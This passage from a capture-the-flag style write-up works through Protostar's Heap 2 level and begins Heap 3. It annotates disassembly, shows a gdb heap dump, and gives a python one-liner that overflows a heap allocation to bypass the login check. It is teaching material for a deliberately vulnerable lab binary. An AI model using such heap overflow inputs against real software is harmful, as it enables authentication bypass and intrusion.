<span class="go">and that&#39;s a wrap folks!</span>
<span class="go">and we have a winner @ 1409414149</span>
<span class="go">Segmentation fault (core dumped)</span>
</code></pre></div>


<h1 id="heap-2">Heap 2</h1>

<p>This time we have something like a login service.
Lets see what the assembly tells about the binary.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x08048940</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="mh">0x8048943</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>
<span class="mh">0x08048942</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>   <span class="n">nop</span>
<span class="mh">0x08048943</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x804b5f8</span><span class="p">,</span><span class="o">%</span><span class="n">ecx</span>      <span class="p">;</span> <span class="n">service</span>
<span class="mh">0x08048949</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x804b5f4</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>      <span class="p">;</span> <span class="n">auth</span>
<span class="mh">0x0804894f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x804ad70</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0x08048954</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">ecx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>      <span class="p">;</span> <span class="n">pass</span> <span class="n">service</span>
<span class="mh">0x08048958</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>      <span class="p">;</span> <span class="n">pass</span> <span class="n">auth</span>
<span class="mh">0x0804895c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">pass</span> <span class="n">format</span> <span class="n">string</span>
<span class="mh">0x0804895f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">43</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804881c</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>This is simply the additional information, that should help beginners like us.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x08048964</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x804b164</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">stdin</span><span class="p">()</span>
<span class="mh">0x08048969</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">pass</span> <span class="n">stdin</span>
<span class="mh">0x0804896d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>    <span class="p">;</span> <span class="n">pass</span> <span class="mi">120</span>
<span class="mh">0x08048975</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048979</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">line</span>
<span class="mh">0x0804897c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80487ac</span> <span class="o">&lt;</span><span class="n">fgets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">;...</span>
</code></pre></div>


<p>So the binary reads up to 120 bytes into a local variable.
This is then compared against four keywords: auth, service, reset, login.
We will examine the respective parts separately.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x080489a7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">115</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x4</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489ae</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">122</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804916a</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
<span class="mh">0x080489b3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x804b5f4</span>        <span class="p">;</span> <span class="n">auth</span>
<span class="mh">0x080489b8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x804b5f4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080489bd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">137</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="mi">0</span> <span class="o">-</span> <span class="n">zero</span> <span class="n">out</span> <span class="n">allocated</span> <span class="n">heap</span>
<span class="mh">0x080489cd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489d0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">156</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x80487bc</span> <span class="o">&lt;</span><span class="n">memset</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080489d5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span> <span class="n">line</span>
<span class="mh">0x080489d9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">165</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="err">$</span><span class="mh">0x5</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>             <span class="p">;</span> <span class="n">skip</span> <span class="s">&quot;auth &quot;</span>
<span class="mh">0x080489dc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">168</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489df</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">171</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x80487fc</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080489e4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">176</span><span class="o">&gt;:</span>  <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0x1e</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>            <span class="p">;</span> <span class="n">less</span> <span class="n">or</span> <span class="n">equal</span> <span class="mi">31</span> <span class="n">bytes</span>
<span class="mh">0x080489e7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">179</span><span class="o">&gt;:</span>  <span class="n">ja</span>     <span class="mh">0x8048a01</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">205</span><span class="o">&gt;</span>
<span class="mh">0x080489e9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">181</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>       <span class="p">;</span> <span class="n">line</span>
<span class="mh">0x080489ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">185</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x5</span><span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">edx</span>        <span class="p">;</span> <span class="n">skip</span> <span class="s">&quot;auth &quot;</span>
<span class="mh">0x080489f0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">188</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x804b5f4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">auth</span>
<span class="mh">0x080489f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">193</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489f9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">197</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080489fc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">200</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804880c</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;^</span>
</code></pre></div>


<p>Auth will allocate 4 bytes on the heap.
That memory space will be zeroed out.
Afterwards, the string length is checked, excluding the keyword.
This is probably done, due to some size restrictions of the destination variable.
Then, the user input is copied to the allocated memory.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x08048a21</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">237</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x804b5f4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">auth</span>
<span class="mh">0x08048a26</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">242</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048a29</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">245</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804999c</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</code></pre></div>


<p>Reset will free the allocated memory for auth.
No security checks are present.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x08048a4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">282</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">line</span>
<span class="mh">0x08048a52</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">286</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="err">$</span><span class="mh">0x7</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>              <span class="p">;</span> <span class="n">skip</span> <span class="s">&quot;service&quot;</span>
<span class="mh">0x08048a55</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">289</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048a58</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">292</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804886c</span> <span class="o">&lt;</span><span class="n">strdup</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048a5d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">297</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x804b5f8</span>         <span class="p">;</span> <span class="n">service</span>
</code></pre></div>


<p>Service will simply copy the input string to service.
No security checks are present.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x08048a86</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">338</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x804b5f4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">auth</span>
<span class="mh">0x08048a8b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">343</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x20</span><span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">auth</span><span class="o">+</span><span class="mi">32</span>
<span class="mh">0x08048a8e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">346</span><span class="o">&gt;:</span>  <span class="n">test</span>   <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08048a90</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">348</span><span class="o">&gt;:</span>  <span class="n">je</span>     <span class="mh">0x8048aa3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">367</span><span class="o">&gt;</span>
<span class="mh">0x08048a92</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">350</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804ada7</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>      <span class="p">;</span> <span class="n">pass</span> <span class="s">&quot;you have logged in already!&quot;</span>
<span class="mh">0x08048a99</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">357</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804883c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048a9e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">362</span><span class="o">&gt;:</span>  <span class="n">jmp</span>    <span class="mh">0x8048943</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">loop</span>
<span class="mh">0x08048aa3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">367</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804adc3</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>      <span class="p">;</span> <span class="n">pass</span> <span class="s">&quot;please enter your password&quot;</span>
<span class="mh">0x08048aaa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">374</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804883c</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048aaf</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">379</span><span class="o">&gt;:</span>  <span class="n">jmp</span>    <span class="mh">0x8048943</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">loop</span>
</code></pre></div>


<p>Login will load the auth struct pointer.
Then, it adjusts the pointer by 32 bytes.
This corresponds to the length check for &ldquo;auth&rdquo;.
The problem is, that only four bytes are mallocated.
This also gives an idea about the most simple solution to solve this level.</p>

<h2 id="malloc">malloc</h2>

<p>A char array for malloc only represents a single pointer.
The struct also contains an integer for authentication.
Thus malloc allocates eight bytes for the struct.
At the same time the char array has a size of 32 bytes.
This means, that the integer is located at struct+32.
Let&rsquo;s take a look at the memory layout.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">x</span> <span class="mh">0x804c008</span>
<span class="mh">0x804c008</span><span class="o">:</span>      <span class="mh">0x61616161</span>      <span class="mh">0x0000000a</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000019</span>
<span class="mh">0x804c018</span><span class="o">:</span>      <span class="mh">0x62626220</span>      <span class="mh">0x62626262</span>      <span class="mh">0x62626262</span>      <span class="mh">0x62626262</span>
<span class="mh">0x804c028</span><span class="o">:</span>      <span class="mh">0x00000a62</span>      <span class="mh">0x00000fd9</span>
</code></pre></div>


<p>The auth struct is stored at 0x804c008.
The service variable is stored right after that.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/opt/protostar/bin$</span> python -c <span class="s1">&#39;print &quot;auth AAAA\n&quot; + &quot;service&quot; + &quot;B&quot; * 16 + &quot;\n&quot; + &quot;login\n&quot;&#39;</span> <span class="p">|</span> /opt/protostar/bin/heap2
<span class="go">[ auth = (nil), service = (nil) ]</span>
<span class="go">[ auth = 0x804c008, service = (nil) ]</span>
<span class="go">[ auth = 0x804c008, service = 0x804c018 ]</span>
<span class="go">you have logged in already!</span>
<span class="go">[ auth = 0x804c008, service = 0x804c018 ]</span>
<span class="go">[ auth = 0x804c008, service = 0x804c018 ]</span>
</code></pre></div>


<p>This is how we can get a nonzero value at the relevant memory position.
Probably the most simple solution to this task.</p>

<h1 id="heap-3">Heap 3</h1>

<p>Let&rsquo;s examine the assembly of this level right away.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x08048892</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x20</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="mi">32</span>
<span class="mh">0x08048899</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
<span class="mh">0x0804889e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">A</span>
<span class="mh">0x080488a2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x20</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="mi">32</span>
<span class="mh">0x080488a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
<span class="mh">0x080488ae</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">B</span>
<span class="mh">0x080488b2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x20</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="mi">32</span>
<span class="mh">0x080488b9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
<span class="mh">0x080488be</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">C</span>
</code></pre></div>


<p>So the binary allocates three heap variables with 32 byte.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x080488c2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>      <span class="p">;</span> <span class="n">ARGV</span>
<span class="mh">0x080488c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>           <span class="p">;</span> <span class="n">ARG1</span>
<span class="mh">0x080488c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080488ca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080488ce</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">A</span>
<span class="mh">0x080488d2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080488d5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080488da</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>      <span class="p">;</span> <span class="n">ARGV</span>
<span class="mh">0x080488dd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="err">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>           <span class="p">;</span> <span class="n">ARG2</span>
<span class="mh">0x080488e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080488e2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080488e6</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">B</span>
<span class="mh">0x080488ea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080488ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080488f2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>      <span class="p">;</span> <span class="n">ARGV</span>
<span class="mh">0x080488f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="err">$</span><span class="mh">0xc</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>           <span class="p">;</span> <span class="n">ARG3</span>
<span class="mh">0x080488f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080488fa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
